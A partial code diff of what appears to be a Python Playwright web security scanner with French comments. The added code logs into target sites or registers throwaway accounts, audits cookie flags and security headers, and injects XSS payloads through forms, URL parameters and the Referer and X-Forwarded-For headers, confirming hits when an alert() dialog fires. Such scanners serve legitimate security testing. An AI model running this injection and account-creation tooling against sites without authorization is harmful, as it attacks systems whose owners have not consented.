+        page.on("response", response_handler)
+
+        await user_el.fill(email)
+        await pwd_field.fill(password)
+
+        submitted = False
+        for sel in (
+            "button[type='submit']", "input[type='submit']",
+            "button:has-text('Log in')", "button:has-text('Sign in')",
+            "button:has-text('Login')", "button:has-text('Sign On')",
+        ):
+            try:
+                btn = await page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click(timeout=2000, force=True)
+                    submitted = True
+                    break
+            except Exception:
+                continue
+        if not submitted:
+            await pwd_field.press("Enter")
+
+        await page.wait_for_timeout(1500)
+        page.remove_listener("response", response_handler)
+
+        dom_verified = await self._verify_logged_in_generic(
+            page, timeout=5000, cookies_before=cookies_before,
+            storage_before=storage_before,
+        )
+        # Le 401/403 explicite prime sur tout signal DOM potentiellement
+        # trompeur (ex : une page d'erreur générique qui n'affiche plus le
+        # champ mot de passe sans pour autant avoir authentifié qui que ce
+        # soit).
+        verified = (dom_verified or network_signal["success"]) and not network_signal["failed"]
+
+        if not verified:
+            raise RuntimeError(
+                "Login form submitted but no authenticated session was "
+                "detected afterwards (wrong password, account doesn't "
+                "exist, or this site's logged-in state couldn't be "
+                "confirmed automatically)."
+            )
+        return True
+
+    async def _finish_login_success(self, page: Page, email: str, auth_mode: str) -> None:
+        token = None
+        try:
+            token = await page.evaluate("window.localStorage.getItem('token')")
+            if token:
+                self.result.auth_token = token
+        except Exception:
+            pass
+        logger.info("Connecté avec les identifiants fournis (%s)", email)
+        await self._analyze_session(
+            page, token_in_local_storage=bool(token), auth_mode=auth_mode,
+        )
+
     async def _register_and_login(self, page: Page) -> None:
         """
         Crée un compte jetable et se connecte AVANT le crawl BFS (jusqu'à 2
@@ -513,6 +1284,8 @@ class PlaywrightCrawler:
         introuvables), on abandonne et le crawl continue en mode anonyme.
         """
         for attempt in range(1, 3):
+            if self._paused():
+                return
             self._login_email, self._login_password = _random_credentials()
             try:
                 if await self._try_register_and_login(page):
@@ -541,9 +1314,18 @@ class PlaywrightCrawler:
         await page.fill("#passwordControl", self._login_password)
         await page.fill("#repeatPasswordControl", self._login_password)
         try:
-            await page.click("#mat-select-0", timeout=3000)
+            # `force=True` : le <mat-label> flottant d'Angular Material
+            # (placeholder "Security Question") chevauche la zone cliquable
+            # du <mat-select> et intercepte les événements pointeur d'un clic
+            # normal, qui timeout alors sans jamais ouvrir le menu — le champ
+            # reste vide et le formulaire (donc #registerButton) reste
+            # invalide indéfiniment. `force` ignore cette vérification
+            # d'interception et clique directement aux coordonnées de
+            # l'élément, ce que confirme un utilisateur réel qui cliquerait
+            # au même endroit sans jamais remarquer le chevauchement visuel.
+            await page.click("#mat-select-0", timeout=3000, force=True)
             await page.wait_for_timeout(200)
-            await page.click("mat-option >> nth=0", timeout=3000)
+            await page.click("mat-option >> nth=0", timeout=3000, force=True)
         except Exception:
             pass
         security_answer = await page.query_selector("#securityAnswerControl")
@@ -567,15 +1349,11 @@ class PlaywrightCrawler:
         # Le menu compte n'expose pas toujours un <a href> classique pour
         # le profil (navigation programmatique) : on ajoute son URL
         # directement comme point d'entrée supplémentaire du crawl.
-        try:
-            await page.wait_for_selector(
-                "#navbarLogoutButton, button[aria-label='Show/hide account menu']",
-                timeout=5000,
-            )
-        except PWTimeout:
+        if not await self._verify_logged_in(page, timeout=5000):
             return False
 
         self._logged_in = True
+        token = None
         try:
             token = await page.evaluate("window.localStorage.getItem('token')")
             if token:
@@ -583,7 +1361,268 @@ class PlaywrightCrawler:
         except Exception:
             pass
         logger.info("Connecté avec le compte jetable %s", self._login_email)
+        await self._analyze_session(page, token_in_local_storage=bool(token))
         return True
+
+    async def _analyze_session(
+        self, page: Page, token_in_local_storage: bool,
+        logged_in: bool = True, auth_mode: str = "auto", note: str = "",
+    ) -> None:
+        """
+        Audit de sécurité de la session tout juste établie — PAS une
+        recherche de XSS, mais une inspection des attributs qui déterminent
+        l'IMPACT d'un XSS trouvé ailleurs sur le site : un cookie de session
+        sans HttpOnly, ou un jeton exposé en localStorage, transforme
+        n'importe quelle injection XSS confirmée en vol de session trivial
+        (`document.cookie` / `localStorage.getItem(...)` dans le payload).
+
+        `auth_mode`/`note` tracent COMMENT la session a été établie (compte
+        jetable auto / identifiants fournis / cookie-JWT fourni) et POURQUOI
+        `logged_in` est faux le cas échéant — sans ça, un échec de connexion
+        avec des identifiants fournis par l'utilisateur se rapportait
+        silencieusement comme "aucune session", sans indiquer qu'il s'agit
+        justement d'un ÉCHEC des identifiants saisis (compte inexistant sur
+        la cible, mauvais mot de passe...).
+        """
+        try:
+            raw_cookies = await page.context.cookies()
+        except Exception:
+            raw_cookies = []
+
+        cookies: list[dict[str, Any]] = []
+        findings: list[dict[str, str]] = []
+
+        for c in raw_cookies:
+            name = c.get("name", "")
+            http_only = bool(c.get("httpOnly"))
+            secure = bool(c.get("secure"))
+            same_site = c.get("sameSite") or "None"
+            expires = c.get("expires")
+            is_session_cookie = expires is None or expires == -1
+
+            issues: list[str] = []
+            if not http_only:
+                issues.append(
+                    "Missing HttpOnly: readable via document.cookie by any "
+                    "injected script — an XSS anywhere on the site can "
+                    "exfiltrate this cookie."
+                )
+            if not secure:
+                issues.append(
+                    "Missing Secure: sent over plain HTTP too, not just "
+                    "HTTPS — interceptable on an insecure network."
+                )
+            if same_site not in ("Strict", "Lax"):
+                issues.append(
+                    f"SameSite={same_site}: still sent on cross-site "
+                    "requests, weakening CSRF protection."
+                )
+            if not is_session_cookie:
+                issues.append(
+                    "Persistent (long-lived) cookie rather than a session "
+                    "cookie: a stolen value stays valid long after the "
+                    "browser closes."
+                )
+
+            cookies.append({
+                "name": name,
+                "domain": c.get("domain", ""),
+                "path": c.get("path", ""),
+                "http_only": http_only,
+                "secure": secure,
+                "same_site": same_site,
+                "session_cookie": is_session_cookie,
+                "issues": issues,
+            })
+            for issue in issues:
+                findings.append({"cookie": name, "issue": issue})
+
+        if token_in_local_storage:
+            findings.append({
+                "cookie": "localStorage['token']",
+                "issue": (
+                    "Session token stored in localStorage (JWT), not in an "
+                    "HttpOnly cookie: directly readable via JavaScript "
+                    "(localStorage.getItem('token')). Any XSS elsewhere on "
+                    "the site — including ones this scan may confirm — can "
+                    "read and exfiltrate it for a full session takeover, no "
+                    "additional vulnerability needed."
+                ),
+            })
+
+        self.result.session_analysis = {
+            "logged_in": logged_in,
+            "auth_mode": auth_mode,
+            "cookies": cookies,
+            "token_in_local_storage": token_in_local_storage,
+            "findings": findings,
+            "note": note,
+        }
+
+    async def _analyze_security_headers(self, response) -> None:
+        """
+        Audit des en-têtes HTTP de sécurité de la réponse principale — PAS
+        une recherche de XSS, mais ce qui détermine si le NAVIGATEUR a un
+        filet de sécurité (CSP en tête) même quand une injection XSS est
+        confirmée ailleurs dans ce rapport. Une CSP stricte peut bloquer
+        l'exécution d'un payload malgré une faille d'échappement côté
+        serveur ; son absence (ou une CSP permissive avec 'unsafe-inline')
+        retire ce filet — c'est exactement pour ça que la plupart des
+        preuves de ce rapport (alert() déclenché) fonctionnent.
+        """
+        try:
+            headers = response.headers if response else {}
+        except Exception:
+            headers = {}
+
+        findings: list[dict[str, str]] = []
+        csp = headers.get("content-security-policy")
+        csp_report_only_value = headers.get("content-security-policy-report-only")
+        csp_report_only = not csp and bool(csp_report_only_value)
+        effective_csp = csp or csp_report_only_value
+
+        if not effective_csp:
+            findings.append({
+                "header": "Content-Security-Policy",
+                "severity": "High",
+                "issue": (
+                    "Missing entirely — the browser has no policy "
+                    "restricting what scripts can run, so a successful XSS "
+                    "payload executes with no additional mitigation."
+                ),
+            })
+        else:
+            directives = _parse_csp(effective_csp)
+            script_src = directives.get("script-src") or directives.get("default-src") or []
+            if not script_src:
+                findings.append({
+                    "header": "Content-Security-Policy", "severity": "High",
+                    "issue": "No script-src or default-src directive — script execution is unrestricted.",
+                })
+            else:
+                if "'unsafe-inline'" in script_src:
+                    findings.append({
+                        "header": "Content-Security-Policy", "severity": "High",
+                        "issue": (
+                            "script-src allows 'unsafe-inline' — inline "
+                            "<script> tags and on*= handlers run freely, "
+                            "defeating CSP's main XSS mitigation (most "
+                            "confirmed findings in this report rely on "
+                            "exactly this vector)."
+                        ),
+                    })
+                if "'unsafe-eval'" in script_src:
+                    findings.append({
+                        "header": "Content-Security-Policy", "severity": "Medium",
+                        "issue": "script-src allows 'unsafe-eval' — eval()/Function()-based payloads can still execute.",
+                    })
+                if "*" in script_src or any(s in ("http:", "https:") for s in script_src):
+                    findings.append({
+                        "header": "Content-Security-Policy", "severity": "Medium",
+                        "issue": (
+                            "script-src allows scripts from any host "
+                            "(wildcard or broad scheme) — an attacker-"
+                            "controlled or compromised third-party script "
+                            "can be loaded."
+                        ),
+                    })
+            if "object-src" not in directives:
+                findings.append({
+                    "header": "Content-Security-Policy", "severity": "Low",
+                    "issue": "No object-src directive — legacy plugin-based vectors (Flash/Java applets) aren't restricted.",
+                })
+            if "base-uri" not in directives:
+                findings.append({
+                    "header": "Content-Security-Policy", "severity": "Low",
+                    "issue": "No base-uri directive — a <base> tag injection could redirect relative script/asset URLs to an attacker's host.",
+                })
+            if csp_report_only:
+                findings.append({
+                    "header": "Content-Security-Policy", "severity": "Medium",
+                    "issue": "Only Content-Security-Policy-Report-Only is set — the policy is monitored but NOT enforced; nothing is actually blocked.",
+                })
+
+        if not headers.get("x-frame-options") and "frame-ancestors" not in (effective_csp or ""):
+            findings.append({
+                "header": "X-Frame-Options", "severity": "Low",
+                "issue": "Missing (and no CSP frame-ancestors) — the page can be framed by another site (clickjacking).",
+            })
+        if (headers.get("x-content-type-options") or "").lower() != "nosniff":
+            findings.append({
+                "header": "X-Content-Type-Options", "severity": "Low",
+                "issue": "Missing 'nosniff' — browsers may MIME-sniff a response into an executable content type.",
+            })
+        if self.origin.startswith("https://") and not headers.get("strict-transport-security"):
+            findings.append({
+                "header": "Strict-Transport-Security", "severity": "Low",
+                "issue": "Missing on an HTTPS site — no protection against protocol downgrade to plain HTTP.",
+            })
+
+        self.result.security_headers = {
+            "checked_url": response.url if response else self.target,
+            "csp_present": bool(csp),
+            "csp_enforced": bool(csp),
+            "raw_csp": effective_csp or "",
+            "findings": findings,
+        }
+
+    async def _probe_header_xss(self, browser) -> None:
+        """
+        Sonde XSS via des en-têtes HTTP réfléchis (Referer, X-Forwarded-For)
+        — vecteur distinct de _probe_dom_xss/_probe_reflected_xss : certaines
+        pages (erreurs, logs applicatifs affichés, bannières "provenance
+        détectée") reflètent ces en-têtes sans échappement ; ni XSStrike ni
+        DalFox ne testent ce vecteur (ils ne fuzzent que l'URL/le corps).
+        Budget dédié et borné : chaque essai ouvre un nouveau contexte
+        navigateur (coûteux), contrairement aux autres sondages qui
+        réutilisent la même page.
+        """
+        if self._header_probe_budget <= 0:
+            return
+
+        for header_name in ("Referer", "X-Forwarded-For"):
+            for payload in HEADER_XSS_PAYLOADS:
+                if self._header_probe_budget <= 0 or self._paused():
+                    return
+                self._header_probe_budget -= 1
+
+                ctx = None
+                try:
+                    ctx = await browser.new_context(
+                        ignore_https_errors=True,
+                        extra_http_headers={header_name: payload},
+                    )
+                    hpage = await ctx.new_page()
+                    self._dialog_fired = False
+                    hpage.on("dialog", lambda d: asyncio.ensure_future(self._on_dialog(d)))
+                    await hpage.goto(
+                        self.target, timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
+                        wait_until="domcontentloaded",
+                    )
+                    await hpage.wait_for_timeout(1000)
+
+                    if self._dialog_fired:
+                        shot = await self._snap(
+                            hpage, f"HTTP header '{header_name}' reflected and executed"
+                        )
+                        await self._record_finding(
+                            hpage, self.target, payload, header_name,
+                            "Header XSS",
+                            f"Payload sent in the HTTP '{header_name}' request "
+                            "header and executed by the page's JS rendering "
+                            "(alert() fired).",
+                            source=f"HTTP request header '{header_name}' "
+                                   "(sent directly by the client, not via URL/form)",
+                            extra_shots=[shot] if shot else None,
+                        )
+                except Exception as exc:
+                    logger.debug("Sondage en-tête %s échoué : %s", header_name, exc)
+                finally:
+                    if ctx:
+                        try:
+                            await ctx.close()
+                        except Exception:
+                            pass
 
     async def _trigger_search_inputs(self, page: Page) -> None:
         """
@@ -722,6 +1761,45 @@ class PlaywrightCrawler:
             ],
         })
 
+    async def _detect_reflection_context(self, page: Page, marker: str) -> str:
+        """
+        Sonde de contexte : localise où un marqueur unique atterrit dans le
+        HTML rendu pour choisir les payloads les plus efficaces EN PREMIER
+        (voir PAYLOAD_CONTEXTS/_ordered_payloads_for_context) — le budget
+        complet reste testé ensuite dans tous les cas, seul l'ordre change.
+        Heuristique best-effort (regex sur le HTML sérialisé), pas une
+        analyse de l'AST — suffisant pour prioriser, pas pour garantir.
+
+        Renvoie : "none" (pas réfléchi), "script", "url", "attribute" ou
+        "html" (texte, cas par défaut).
+        """
+        try:
+            content = await page.content()
+        except Exception:
+            return ""
+
+        idx = content.find(marker)
+        if idx == -1:
+            return "none"
+
+        before = content[max(0, idx - 80):idx]
+
+        # Contexte <script> : le marqueur est après une balise <script>
+        # ouvrante plus récente que la dernière fermante avant lui.
+        script_open = content.rfind("<script", 0, idx)
+        script_close = content.rfind("</script", 0, idx)
+        if script_open != -1 and script_open > script_close:
+            return "script"
+
+        # Contexte attribut : précédé par `="` ou `='` sans balise fermante
+        # entre les deux (donc toujours à l'intérieur de la même balise).
+        if re.search(r'=["\']$', before):
+            if re.search(r'(href|src)\s*=["\']$', before, re.IGNORECASE):
+                return "url"
+            return "attribute"
+
+        return "html"
+
     async def _probe_dom_xss(self, page: Page, base_url: str) -> None:
         """
         Teste activement les champs texte/recherche visibles avec une petite
@@ -746,11 +1824,30 @@ class PlaywrightCrawler:
             return
 
         for inp in inputs[:2]:
-            if self._dom_probe_budget <= 0:
+            if self._dom_probe_budget <= 0 or self._paused():
                 break
             before_shot = await self._snap(page, "Before injection (empty field)")
-            for payload in DOM_XSS_PAYLOADS:
-                if self._dom_probe_budget <= 0:
+
+            # Sonde de contexte (marqueur unique, pas de coût de budget) :
+            # réordonne le corpus pour tester en premier les payloads les
+            # plus efficaces LÀ où la valeur atterrit réellement (texte HTML,
+            # attribut, script...) — voir _detect_reflection_context. Le
+            # budget complet reste tenté, seul l'ordre change.
+            payload_order = DOM_XSS_PAYLOADS
+            try:
+                marker = f"xsscanary{uuid.uuid4().hex[:8]}"
+                await inp.fill(marker)
+                await inp.press("Enter")
+                await page.wait_for_timeout(500)
+                ctx = await self._detect_reflection_context(page, marker)
+                if ctx:
+                    payload_order = _ordered_payloads_for_context(ctx)
+                await inp.fill("")
+            except Exception:
+                pass
+
+            for payload in payload_order:
+                if self._dom_probe_budget <= 0 or self._paused():
                     break
                 self._dom_probe_budget -= 1
                 self._dialog_fired = False
@@ -812,11 +1909,30 @@ class PlaywrightCrawler:
         # restaure systématiquement la page d'origine avant de rendre la
         # main, succès ou non.
         before_shot = await self._snap(page, "Before injection (original page)")
+
+        # Sonde de contexte (marqueur unique, pas de coût de budget) : voir
+        # _probe_dom_xss pour le principe — réordonne le corpus sans le
+        # réduire, pour confirmer une vulnérabilité plus tôt dans le budget.
+        payload_order = DOM_XSS_PAYLOADS
+        try:
+            marker = f"xsscanary{uuid.uuid4().hex[:8]}"
+            marker_url = f"{self.origin}/#/search?q={quote(marker)}"
+            await page.goto(
+                marker_url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
+                wait_until="domcontentloaded",
+            )
+            await page.wait_for_timeout(700)
+            ctx = await self._detect_reflection_context(page, marker)
+            if ctx:
+                payload_order = _ordered_payloads_for_context(ctx)
+        except Exception:
+            pass
+
         try:
             # Tout le corpus (borné par le budget global, pas par un premier
             # succès) : demande explicite de tester large sur ce vecteur.
-            for payload in DOM_XSS_PAYLOADS:
-                if self._reflected_probe_budget <= 0:
+            for payload in payload_order:
+                if self._reflected_probe_budget <= 0 or self._paused():
                     break
                 self._reflected_probe_budget -= 1
                 self._dialog_fired = False
@@ -868,7 +1984,7 @@ class PlaywrightCrawler:
 
         candidates = DOM_XSS_PAYLOADS[:6]
         for attempt, payload in enumerate(candidates):
-            if self._form_probe_budget <= 0:
+            if self._form_probe_budget <= 0 or self._paused():
                 break
 
             if attempt > 0:
@@ -919,7 +2035,7 @@ class PlaywrightCrawler:
 
             tested_any = False
             for field in fields[:3]:
-                if self._form_probe_budget <= 0:
+                if self._form_probe_budget <= 0 or self._paused():
                     break
                 try:
                     if not await field.is_visible() or not await field.is_enabled():
@@ -1038,8 +2154,15 @@ class PlaywrightCrawler:
 
             # Authentification AVANT le crawl BFS : sans session, tout un pan
             # du site (profil, feedback avec auteur, menu compte étendu...)
-            # reste invisible au crawler (voir _register_and_login).
-            await self._register_and_login(page)
+            # reste invisible au crawler. Priorité : cookie/JWT fournis par
+            # l'utilisateur (session réelle) > identifiants fournis (compte
+            # réel) > compte jetable auto-généré (voir _register_and_login).
+            if self.auth_cookie or self.auth_jwt:
+                await self._apply_manual_session(page)
+            elif self.auth_username and self.auth_password:
+                await self._login_with_credentials(page, self.auth_username, self.auth_password)
+            else:
+                await self._register_and_login(page)
 
             # File d'attente BFS : (url, profondeur)
             queue: list[tuple[str, int]] = [(self.target, 0)]
@@ -1050,15 +2173,20 @@ class PlaywrightCrawler:
                 queue.append((f"{self.origin}/profile", 0))
 
             try:
-                while queue and len(self._visited) < self.max_pages:
+                while (
+                    queue
+                    and len(self._visited) < self.max_pages
+                    and not (self.stop_event and self.stop_event.is_set())
+                ):
                     url, depth = queue.pop(0)
                     url = self._normalize(url)
                     if url in self._visited or depth > self.max_depth:
                         continue
                     self._visited.add(url)
 
+                    resp = None
                     try:
-                        await page.goto(
+                        resp = await page.goto(
                             url,
                             timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                             wait_until="networkidle",
@@ -1067,7 +2195,7 @@ class PlaywrightCrawler:
                         # networkidle échoue souvent sur les SPA : on retente en
                         # se contentant du chargement du DOM.
                         try:
-                            await page.goto(
+                            resp = await page.goto(
                                 url,
                                 timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                                 wait_until="domcontentloaded",
@@ -1078,6 +2206,13 @@ class PlaywrightCrawler:
                     except Exception as exc:
                         self.result.errors.append(f"{url} : {exc}")
                         continue
+
+                    # En-têtes de sécurité (CSP...) : une seule fois, sur la
+                    # première page — généralement identiques sur tout le
+                    # site (même serveur/config), voir _analyze_security_headers.
+                    if not self._headers_checked:
+                        self._headers_checked = True
+                        await self._analyze_security_headers(resp)
 
                     # Laisser le JS s'exécuter un court instant (rendu SPA).
                     await page.wait_for_timeout(600)
@@ -1115,6 +2250,13 @@ class PlaywrightCrawler:
                     for link in await self._extract_links(page, url):
                         if link not in self._visited:
                             queue.append((link, depth + 1))
+
+                # Sondage XSS via en-têtes HTTP réfléchis (Referer, X-
+                # Forwarded-For) — vecteur distinct de tout ce qui précède,
+                # voir _probe_header_xss. Une seule passe après le BFS,
+                # bornée par son propre budget.
+                if not self._paused():
+                    await self._probe_header_xss(browser)
 
             finally:
                 await context.close()
